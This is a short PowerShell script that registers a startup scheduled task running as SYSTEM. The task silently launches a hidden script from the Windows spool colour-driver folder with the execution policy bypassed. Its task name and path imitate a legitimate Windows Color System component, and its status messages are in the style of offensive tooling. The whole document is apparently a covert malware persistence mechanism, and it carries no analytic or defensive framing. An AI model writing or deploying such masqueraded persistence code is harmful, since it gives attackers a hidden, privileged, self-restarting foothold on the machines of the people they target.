try {
    $action = New-ScheduledTaskAction `
        -Execute "powershell.exe" `
        -Argument "-WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -File `"C:\Windows\System32\spool\drivers\color\ColorProfile_svc.ps1`""

    $trigger = New-ScheduledTaskTrigger -AtStartup

    $settings = New-ScheduledTaskSettingsSet `
        -ExecutionTimeLimit (New-TimeSpan -Hours 0) `
        -RestartCount 3 `
        -RestartInterval (New-TimeSpan -Minutes 1)

    Register-ScheduledTask `
        -TaskName "ColorProfileUpdater" `
        -TaskPath "\Microsoft\Windows\WindowsColorSystem\" `
        -Action $action `
        -Trigger $trigger `
        -Settings $settings `
        -RunLevel Highest `
        -User "SYSTEM" `
        -Force

    Write-Host "[+] Task registered successfully"
} catch {
    Write-Host "[-] Failed: $_"
}